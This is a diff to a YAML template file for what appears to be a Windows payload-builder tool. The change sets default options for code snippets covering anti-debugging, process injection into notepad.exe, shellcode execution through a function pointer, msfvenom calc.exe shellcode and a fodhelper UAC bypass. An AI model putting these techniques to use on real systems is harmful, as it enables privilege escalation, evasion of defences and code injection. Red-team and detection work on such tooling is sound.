@@ -79,6 +79,7 @@ sections:
     items:
       - id: "AdfCloseHandleOnInvalidAddress"
         display: "AdfCloseHandleOnInvalidAddress"
+        default: true
         snippet: |
           __try
           {
@@ -106,9 +107,11 @@ sections:
         placement: "before"
         width: 240
         required: true
+        defaultValue: "notepad.exe"
     items:
       - id: "MpfProcessInjectionViaProcessReflection"
         display: "MpfProcessInjectionViaProcessReflection"
+        default: true
         snippet: |
           if (MpfProcessInjectionViaProcessReflection((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L"$psname$", true))) return 1;
 
@@ -119,6 +122,7 @@ sections:
     items:
       - id: "PayloadExecViaFuncPtr"
         display: "Payload Execution Via Function Pointer"
+        default: true
         snippet: |
               void* executableMemory = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
@@ -146,6 +150,7 @@ sections:
     items:
       - id: "GenericShellcodeOpenCalcExitThread"
         display: "GenericShellcodeOpenCalcExitThread"
+        default: true
         snippet: |
           //msfvenom -p windows/x64/exec EXITFUNC=thread CMD=calc.exe -f c -a x64
           //Length = 277
@@ -196,11 +201,13 @@ sections:
         placement: "before"
         width: 240
         required: true
+        defaultValue: "PROCESSOR_LEVEL#equals#6"
         infoAction: "GuardRailInfo"
         infoButtonLabel: "Info"
     items:
       - id: "RequireEnvironmentVariable"
         display: "Require Environment Variable"
+        default: true
         snippet: |
           if (GetEnvironmentVariableW(L"__GUARDRAIL_PARAM__", nullptr, 0) == 0)
           {
@@ -214,6 +221,7 @@ sections:
     items:
       - id: "UacBypassFodHelperMethodA"
         display: "UacBypassFodHelperMethodA"
+        default: true
         snippet: |
           PROCESS_INFORMATION pi{};
           if (UacBypassFodHelperMethodA("C:\Windows\System32\cmd.exe", &pi))
